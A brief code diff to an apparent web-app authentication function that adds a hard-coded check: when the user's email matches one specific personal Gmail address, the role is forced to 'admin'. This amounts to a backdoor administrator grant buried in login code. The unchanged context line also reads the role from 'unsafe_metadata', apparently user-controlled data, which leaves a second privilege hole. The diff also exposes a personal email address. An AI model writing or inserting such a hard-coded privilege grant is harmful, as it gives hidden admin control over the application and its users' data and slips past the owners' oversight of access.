@@ -63,6 +63,8 @@ async def get_current_user(
                     if not full_name:
                         full_name = "Unknown User"
                     role = data.get("unsafe_metadata", {}).get("role") or data.get("public_metadata", {}).get("role") or "buyer"
+                    if email == "ishuthapa877@gmail.com":
+                        role = "admin"
                     
                     # Check if user already exists by email (legacy user)
                     existing_user_result = await db.execute(select(User).where(User.email == email))
